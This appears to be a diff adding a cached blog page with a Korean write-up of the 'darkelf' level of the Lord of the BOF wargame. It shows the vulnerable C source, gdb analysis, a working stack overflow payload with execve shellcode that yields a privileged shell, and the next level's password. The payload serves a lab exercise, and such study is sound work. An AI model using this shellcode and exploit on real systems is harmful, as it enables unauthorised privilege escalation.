@@ -1,0 +1,113 @@
+I"-!<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: wolfman
+Password:
+<span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span><span class="nb">ls
+</span>darkelf  darkelf.c  tmp
+<span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span><span class="nb">cat </span>darkelf.c
+/<span class="k">*</span>
+        The Lord of the BOF : The Fellowship of the BOF
+        - darkelf
+        - egghunter + buffer hunter + check length of argv[1]
+<span class="k">*</span>/
+
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+extern char <span class="k">**</span>environ<span class="p">;</span>
+
+main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
+<span class="o">{</span>
+        char buffer[40]<span class="p">;</span>
+        int i<span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        // egghunter
+        <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> environ[i]<span class="p">;</span> i++<span class="o">)</span>
+                memset<span class="o">(</span>environ[i], 0, strlen<span class="o">(</span>environ[i]<span class="o">))</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="o">(</span>argv[1][47] <span class="o">!=</span> <span class="s1">'\xbf'</span><span class="o">)</span>
+        <span class="o">{</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"stack is still your friend.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        // check the length of argument
+        <span class="k">if</span><span class="o">(</span>strlen<span class="o">(</span>argv[1]<span class="o">)</span> <span class="o">&gt;</span> 48<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"argument is too long!</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+
+        strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
+
+        // buffer hunter
+        memset<span class="o">(</span>buffer, 0, 40<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>wolfman/love eyuna로 접속하자.</p>
+
+<p>C 프로그램을 인좌를 주며 실행시키면 순서대로 argv[1],argc[2] 이렇게 들어간다.</p>
+
+<p>소스에는 argv[1]에 길이 제한을 최대 48까지 걸어두었다.</p>
+
+<p>그렇다면 RET까지 거리는 딱 되므로 argv[1]에 RET까지, argv[2]에 쉘 코드를 넣자.</p>
+
+<p>argv[2]가 시작하는 주소를 구하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span><span class="nb">mkdir </span>tmp
+<span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span><span class="nb">cp </span>darkelf tmp/
+<span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span><span class="nb">cd </span>tmp
+<span class="o">[</span>wolfman@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> darkelf
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+0x8048500 &lt;main&gt;:       push   %ebp
+0x8048501 &lt;main+1&gt;:     mov    %esp,%ebp
+0x8048503 &lt;main+3&gt;:     sub    <span class="nv">$0x2c</span>,%esp
+...
+0x80485ec &lt;main+236&gt;:   push   %eax
+0x80485ed &lt;main+237&gt;:   call   0x8048440 &lt;strcpy&gt;
+0x80485f2 &lt;main+242&gt;:   add    <span class="nv">$0x8</span>,%esp
+0x80485f5 &lt;main+245&gt;:   lea    0xffffffd8<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+</code></pre></div></div>
+<p>main+237에서 strcpy하는 것이 보인다.</p>
+
+<p>그 밑줄, main+242에 break를 걸고 돌리자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48'</span><span class="si">)</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*100'</span><span class="si">)</span>
+Starting program: /home/wolfman/tmp/darkelf <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48'</span><span class="si">)</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*100'</span><span class="si">)</span>
+Breakpoint 1, 0x80485f2 <span class="k">in </span>main <span class="o">()</span>
+
+</code></pre></div></div>
+<p>인좌를 여러개 주는 방법은 간단하다.</p>
+
+<p>그냥 python 코드를 두개 쓰자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/300x <span class="nv">$esp</span>
+0xbffffa44:     0xbffffa50      0xbffffbd1      0x00000015      0xbfbfbfbf
+0xbffffa54:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffa64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+...
+0xbffffbe4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
+0xbffffbf4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x414100bf
+0xbffffc04:     0x41414141      0x41414141      0x41414141      0x41414141
+</code></pre></div></div>
+<p>저 밑에서 bf와 A가 있는 것이 보인다.</p>
+
+<p>쉘 코드가 들어갈 위치에 A를 넣은 것이므로, RET주소는 bffffc04로 잡자.</p>
+
+<p>페이로드 형식은 nop(44)+RET,nop(100)+쉘 코드.</p>
+
+<p>사용할 24byte짜리 쉘 코드다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>wolfman@localhost wolfman]<span class="nv">$ </span>./darkelf <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*44+"\x04\xfc\xff\xbf"'</span><span class="si">)</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*100+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱??
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 506
+kernel crashed
+</code></pre></div></div>
+<p>성공했다.
+wolfman’s password : “kernel crashed”</p>
+
+:ET
